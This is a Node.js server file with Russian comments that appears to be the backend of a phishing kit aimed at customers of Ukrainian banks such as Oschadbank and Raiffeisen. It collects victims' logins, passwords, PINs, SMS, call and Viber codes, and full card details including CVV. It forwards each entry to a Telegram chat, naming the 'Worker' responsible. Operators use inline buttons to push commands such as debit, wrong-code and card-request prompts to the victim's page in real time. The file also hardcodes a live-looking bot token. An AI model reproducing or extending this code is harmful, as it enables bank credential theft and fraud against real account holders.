Const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- КОНФИГУРАЦИЯ ---
const TELEGRAM_BOT_TOKEN = '8383351361:AAF8fhC3zwfegB2lF6hlwqw2U5UozpGxn_k';
const CHAT_ID = '-4961970994';
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// !!! НОВАЯ КОНСТАНТА: URL для Web App (index.html) !!!
// Она должна указывать на публичный HTTPS URL, где находится ваш index.html
const WEB_APP_URL = RENDER_EXTERNAL_URL ? RENDER_EXTERNAL_URL : 'https://your-public-url.com'; 

// --- ИНИЦИАЛИЗАЦИЯ ---
const app = express();
app.use(express.json());
app.use(cors());

// Логирование запросов
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Маршруты для отдачи статических файлов
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/index.html', (req, res) => {
    // Добавлен отдельный маршрут для /index.html на случай, если Web App использует его
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Инициализация Telegram бота
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Установка вебхука
if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook установлен на ${WEBHOOK_URL}`))
        .catch(err => console.error('Ошибка установки вебхука:', err));
    bot.sendMessage(CHAT_ID, '✅ Бот перезапущен и готов к работе!', { parse_mode: 'HTML' })
        .catch(err => console.error('Ошибка отправки сообщения в Telegram:', err));
} else {
    console.error('Ошибка: RENDER_EXTERNAL_URL не определен. Вебхук не установлен. Используется локальный запуск.');
}

// Проверка статуса бота
bot.getMe()
    .then(me => console.log(`Бот запущен: @${me.username}`))
    .catch(err => console.error('Ошибка инициализации бота:', err));

// Обработка входящих обновлений от Telegram
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Инициализация WebSocket сервера
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

// Обработка WebSocket-соединений
wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Ошибка обработки WebSocket сообщения:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
});


// =========================================================
// !!! НОВЫЙ ОБРАБОТЧИК ДЛЯ TELEGRAM WEB APP DATA !!!
// =========================================================
bot.on('web_app_data', async (msg) => {
    const chatId = msg.chat.id;
    const dataString = msg.web_app_data.data;
    
    try {
        const data = JSON.parse(dataString);
        
        if (data.type === 'call_code_submit' && data.code && data.phone) {
            
            // Находим или создаем сессию для отправки в админ-чат
            const sessionId = `web_app_${data.phone}_${Date.now()}`;
            sessions.set(sessionId, { phone: data.phone, bankName: 'Ощадбанк' });

            const message = `<b>📞 Код со звонка (Ощадбанк - Web App)</b>\n\n` +
                           `<b>Код:</b> <code>${data.code}</code>\n` +
                           `<b>Номер телефона:</b> <code>${data.phone}</code>\n` +
                           `<b>Worker:</b> @${msg.from.username || 'N/A'}\n`;
            
            // Отправка в админ-чат с клавиатурой, но без кнопки Web App, чтобы не зацикливать
            bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                            { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
                        ],
                        [
                            { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                            { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
                            { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
                        ],
                        [
                            { text: 'Другой банк', callback_data: `other:${sessionId}` },
                            { text: 'Забанить', callback_data: `ban:${sessionId}` },
                        ],
                    ]
                }
            });

            // Отправка подтверждения пользователю (опционально)
            bot.sendMessage(chatId, `✅ Код подтверждения **${data.code}** со звонка принят.`, { parse_mode: 'Markdown' });
        }
    } catch (e) {
        console.error('Ошибка обработки web_app_data:', e);
        bot.sendMessage(chatId, 'Произошла ошибка при обработке данных из формы.');
    }
});

// =========================================================
// !!! НОВАЯ КОМАНДА ДЛЯ ТЕСТИРОВАНИЯ/ЗАПУСКА WEB APP !!!
// =========================================================
bot.onText(/\/call (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const phone = match[1].trim(); 

    if (!phone.startsWith('+')) {
        return bot.sendMessage(chatId, 'Пожалуйста, введите номер с кодом страны, например: /call +380XXXXXXXXX');
    }

    // Формируем URL для Web App, передавая номер как GET-параметр
    const fullWebAppUrl = `${WEB_APP_URL}/index.html?phone=${encodeURIComponent(phone)}`;
    
    // Создаем inline-клавиатуру с кнопкой Web App
    const keyboard = {
        inline_keyboard: [
            [{ 
                text: '📞 Звонок', 
                web_app: { url: fullWebAppUrl } 
            }]
        ]
    };

    bot.sendMessage(chatId, `Нажмите кнопку "Звонок" для вызова формы подтверждения звонком для номера **${phone}**.`, {
        reply_markup: keyboard,
        parse_mode: 'Markdown'
    });
});
// =========================================================


// --- ОБРАБОТКА CALLBACK QUERY ОТ TELEGRAM ---
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    const sessionData = sessions.get(sessionId) || {};
    let command = { type, data: {} };
    let responseText = `Команда "${type}" отправлена!`;

    // =========================================================
    // !!! ДОБАВЛЕН НОВЫЙ ТИП CALLBACK ДЛЯ ОТПРАВКИ WEB APP !!!
    // =========================================================
    if (type === 'call_app') {
        const phone = sessionData.phone || sessionData.fp_phone;
        if (!phone) {
             bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: номер телефона не найден в сессии!', show_alert: true });
             return;
        }

        const fullWebAppUrl = `${WEB_APP_URL}/index.html?phone=${encodeURIComponent(phone)}`;
        
        const keyboard = {
            inline_keyboard: [
                [{ 
                    text: '📞 Открыть форму Звонка', 
                    web_app: { url: fullWebAppUrl } 
                }]
            ]
        };
        
        // Отправляем пользователю в приватный чат кнопку для открытия Web App
        bot.sendMessage(callbackQuery.from.id, `Для подтверждения звонком используйте кнопку ниже:`, {
            reply_markup: keyboard
        });
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Кнопка Web App отправлена в личный чат.' });
        return;
    }
    // =========================================================


    if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.error(`Ошибка: Клиент ${sessionId} не в сети`);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
        return;
    }

    switch (type) {
        case 'lk':
        case 'call':
        case 'ban':
            break;
        case 'number_error':
            command.type = 'number_error';
            command.data = { loginType: sessionData.loginMethod || 'phone' };
            responseText = 'Запрос "неверный номер" отправлен!';
            break;
        case 'telegram_debit':
            command.type = sessionData.bankName === 'Ощадбанк' ? 'telegram_debit' : 'show_debit_form';
            break;
        case 'password_error':
            if (sessionData.bankName === 'Райффайзен') {
                command.type = 'raiff_pin_error';
                responseText = 'Запрос "неверный пароль" отправлен!';
            } else {
                command.type = 'password_error';
                command.data = { loginType: sessionData.loginMethod || 'phone' };
                responseText = 'Запрос "неверный пароль" отправлен!';
            }
            break;
        case 'client_not_found':
            command.type = 'client_not_found';
            responseText = 'Запрос "Клиент не найден" отправлен!';
            break;
        case 'code_error':
            if (sessionData.bankName === 'Райффайзен') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName === 'Ощадбанк') {
                command.type = 'code_error';
            } else {
                command.type = 'generic_debit_error';
            }
            responseText = 'Запрос "неверный код" отправлен!';
            break;
        case 'request_details':
            if (sessionData.bankName === 'Альянс') {
                command.type = 'request_alliance_card_details';
            } else if (sessionData.bankName !== 'Ощадбанк') {
                command.type = 'show_card_details_form';
            } else {
                bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
                return;
            }
            responseText = `Запрос деталей карты (${sessionData.bankName}) отправлен!`;
            break;
        case 'other':
            command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
            break;
        case 'viber_call':
            command.type = 'viber';
            responseText = 'Запрос Viber 📞 отправлен!';
            break;
        case 'redirect_call':
            command.type = 'redirect_call';
            responseText = 'Запрос Переадресация 📞 отправлен!';
            break;
        default:
            console.error(`Неизвестная команда: ${type}`);
            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
            return;
    }

    try {
        ws.send(JSON.stringify(command));
        bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
        console.log(`Команда ${type} отправлена клиенту ${sessionId}`);
    } catch (error) {
        console.error(`Ошибка отправки команды ${type} клиенту ${sessionId}:`, error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка отправки команды!', show_alert: true });
    }
});

// --- ОБРАБОТКА API SUBMIT ---
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    if (!sessionId) {
        console.error('Ошибка: sessionId отсутствует');
        return res.status(400).json({ message: 'SessionId required' });
    }

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Ошибка декодирования referrer:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);

    let message = '';

    if (newData.bankName === 'Райффайзен') {
        if (stepData.phone) {
            message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n` +
                     `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.sms_code) {
            message = `<b>💬 Код из SMS (Райф)</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.sms_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.pin) {
            message = `<b>🔒 PIN-код (Райф)</b>\n\n` +
                     `<b>Пин:</b> <code>${stepData.pin}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.debit_sms_code) {
            message = `<b>💸 Код списания (Райф)</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone || 'не указан'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
    } else {
        if (stepData.viber_code) {
            message = `<b>📞 Код из Viber (Ощад)</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.viber_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } 
        // =========================================================
        // !!! БЛОК ДЛЯ СТАРОГО ПОТОКА (если не используется Web App) !!!
        // ВАЖНО: Код со звонка из Web App будет обрабатываться в новом web_app_data выше.
        // =========================================================
        else if (stepData.call_code) {
            message = `<b>📞 Код со звонка (Ощад) - СТАРЫЙ ПОТОК</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.call_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } 
        // =========================================================
        else if (stepData.sms_code) {
            message = `<b>💸 Код списания (Ощад)</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.sms_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.debit_sms_code) {
            message = `<b>💸 Код списания (${newData.bankName})</b>\n\n` +
                     `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n` +
                     `<b>Номер телефона:</b> <code>${newData.phone || 'не указан'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.card_details) {
            const details = stepData.card_details;
            message = `<b>💳 Данные карты (${newData.bankName})</b>\n\n` +
                     `<b>Номер карты:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n` +
                     `<b>Срок действия:</b> <code>${details.exp || details.exp_date || 'N/A'}</code>\n` +
                     `<b>CVV:</b> <code>${details.cvv || 'N/A'}</code>\n` +
                     `<b>Баланс:</b> <code>${details.balance || 'N/A'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.fp_pin) {
            message = `<b>🔧 Восстановление (Ощад)</b>\n\n` +
                     `<b>Название банка:</b> ${newData.bankName}\n` +
                     `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n` +
                     `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n` +
                     `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.password && (stepData.login || stepData.phone)) {
            if (stepData.login) {
                message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n` +
                         `<b>Название банка:</b> ${newData.bankName}\n` +
                         `<b>Логин:</b> <code>${stepData.login}</code>\n` +
                         `<b>Пароль:</b> <code>${stepData.password}</code>\n` +
                         `<b>Worker:</b> @${workerNick}\n`;
            } else {
                message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n` +
                         `<b>Название банка:</b> ${newData.bankName}\n` +
                         `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n` +
                         `<b>Пароль:</b> <code>${stepData.password}</code>\n` +
                         `<b>Worker:</b> @${workerNick}\n`;
            }
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (isFinalStep) {
            message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n` +
                     `<b>Название банка:</b> ${newData.bankName}\n` +
                     (newData.phone ? `<b>Номер телефона:</b> <code>${newData.phone}</code>\n` : '') +
                     (newData.card_number ? `<b>Номер карты:</b> <code>${newData.card_number}</code>\n` : '') +
                     (newData.card ? `<b>Номер карты:</b> <code>${newData.card}</code>\n` : '') +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// --- ОБРАБОТКА SMS (СТАРЫЙ ПОТОК) ---
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;

    if (!sessionId || !code) {
        console.error('Ошибка: sessionId или code отсутствует');
        return res.status(400).json({ message: 'SessionId and code required' });
    }

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Ошибка декодирования referrer:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        const message = `<b>💬 Получено SMS (старый поток)</b>\n\n` +
                       `<b>Код:</b> <code>${code}</code>\n` +
                       (sessionData.phone ? `<b>Номер телефона:</b> <code>${sessionData.phone}</code>\n` : '') +
                       `<b>Сессия:</b> <code>${sessionId}</code>\n` +
                       `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        console.error(`Ошибка: Сессия ${sessionId} не найдена`);
        res.status(404).json({ message: 'Session not found' });
    }
});

// --- ОТПРАВКА СООБЩЕНИЯ В TELEGRAM С КЛАВИАТУРОЙ ---
function sendToTelegram(message, sessionId, bankName) {
    let keyboard = [];

    if (bankName === 'Ощадбанк') {
        keyboard = [
            [
                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                { text: 'Звонок 📞 App', callback_data: `call_app:${sessionId}` }, // !!! НОВАЯ КНОПКА !!!
            ],
            [
                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
                { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
            ],
            [
                { text: 'Другой банк', callback_data: `other:${sessionId}` },
                { text: 'Забанить', callback_data: `ban:${sessionId}` },
            ],
        ];
    } else if (bankName === 'Райффайзен') {
        keyboard = [
            [
                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
            ],
            [
                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
            ],
            [
                { text: 'Другой банк', callback_data: `other:${sessionId}` },
                { text: 'Забанить', callback_data: `ban:${sessionId}` },
            ],
        ];
    } else {
        keyboard = [
            [
                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
            ],
            [
                { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
            ],
            [
                { text: 'Другой банк', callback_data: `other:${sessionId}` },
                { text: 'Забанить', callback_data: `ban:${sessionId}` },
            ],
        ];
    }

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard },
    }).catch(err => console.error('Ошибка отправки сообщения в Telegram:', err));
}

// --- ЗАПУСК СЕРВЕРА ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
